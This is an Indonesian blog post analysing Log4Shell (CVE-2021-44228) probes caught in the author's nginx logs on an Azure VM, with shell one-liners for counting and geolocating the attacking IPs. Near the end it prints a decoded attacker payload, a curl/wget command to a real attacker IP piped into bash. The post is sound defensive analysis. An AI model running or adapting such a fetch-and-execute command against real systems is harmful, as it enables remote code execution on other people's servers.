---
layout: post
published: true
title: nginx log terkait log4j/ log4shell
author: admin
comments: true
date: '2021-12-24 22:00'
categories:
  - vuln
  - nginx
  - log
---
#### intro

log4j/ log4shell adalah sebuah vuln yang cukup menghebohkan di akhir tahun ini, hal ini karena aplikasi logging ini cukup banyak di pakai di software OSS, serta vuln. nya yang cukup parah.
salah satu script logging memiliki kelemahan yang membuat attacker bisa menjalankan perintah dari jauh (RCE) dengan mengirimkan parameter tertentu ke service yang menjalankan j4log tersebut.
tulisan ini memperlihatkan beberapa exploitasi yang tertangkap di nginx log milik penulis di salah satu penyedia jasa cloud.
<!--more-->
#### informasi terkait log4j/ log4shell
informasi cve-nya: (mitre)[https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228]
cara kerja exploit: ![log4j](/images/log4j.jpg)
#### nginx di azure
beberapa hari setelah berita log4j ramai di jagat infosec, dan karena masih terdapat sisa credit azure, maka penulis menjalankan aplikasi nginx di salah satu vm di azure.
sebenarnya penulis juga menjalankan inetsim, untuk mencoba peruntungan pada port lain, namun log inetsim sangat sedikit (jarang di akses), dan mungkin nanti dilakukan update pada tulisan ini setelah inetsim lebih laku.
hasil dari log selama beberapa hari tersebut membuat kita bisa mempelajari lebih jauh serangan yang dilakukan. berikut beberapa hasilnya:

1. ip berdasarkan request terbanyak yang memuat string "jndi"
```bash
cat access.log* | grep -i jndi |awk '{print $1}'| sort | uniq -c | sort -rn
```
![log4j](/images/log4j2.PNG)

2. menambahkan negara ke list ip pada nomor sebelumnya
```bash
cat top_ip_jndi.txt | while read amt ip;do country=$(geoiplookup $ip | awk -v FS="(GeoIP Country Edition: |,)" {print }); echo $amt $ip $country; done;
```
![log4j](/images/log4j3.PNG)

3. melihat rincian string exploit
```bash
cat access.log* | grep -i jndi |awk '{print $7}'| sort | uniq -c | sort -rn
```
![log4j](/images/log4j1.PNG)

dengan merefer ke gambar pada bagian awal, kita dapat melihat bahwa serangan ini cukup sederhana. attacker mengirimkan string lookup ke sebuah server yang dikuasai, reply dari lookup tersebut akan di eksekusi oleh server target (RCE).
namun terlihat pada gambar diatas, kebanyakan serangan tersebut hanya bertujuan recon/ mengetahui apakah server vulnerable, dan bukan  merupakan RCE.
string yang paling banyak ditemui (urutan pertama) di-encode dengan base64, yang bila di-decode menampilkan:
```bash
(curl -s 195.54.160.149:5874/[targetsvr]:80||wget -q -O- 195.54.160.149:5874/[targetsvr]:80)|bash
```
secara sederhana mengirimkan alamat [targetsvr] ke resources yang dikuasai penyerang (195.54.160.149) dengan curl/ wget.

#### penutup
walaupun cukup heboh, nampaknya tidak terlalu banyak juga penyerang yang memanfaatkan log4j. Mungkin juga ada attacker yang ketika mengenali versi nginx yang saya jalankan, dan memutuskan tidak perlu mengirimkan string "jndi" sehingga saya tidak mendeteksinya.
sudah terdapat beberapa langkah mitigasi di dunia maya, sehingga bila anda terdampak, sangat disarankan melakukan mitigasi.
log dari inetsim sendiri akan saya update bila tidak terlalu malas.
